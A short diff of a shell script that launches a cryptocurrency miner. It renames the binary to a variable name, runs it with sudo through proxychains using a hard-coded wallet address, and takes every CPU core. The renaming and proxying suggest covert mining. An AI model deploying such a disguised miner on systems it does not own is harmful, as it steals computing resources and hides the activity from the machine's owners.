@@ -32,4 +32,3 @@ do
     mv miner $name
     pgrep $name ||sudo proxychains ./$name --wallet-address="NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" --pool=$2 --deviceLabel=$hostname --type=dumb --miner=$(($(grep -c ^processor /proc/cpuinfo)-0))
 done
-mv 
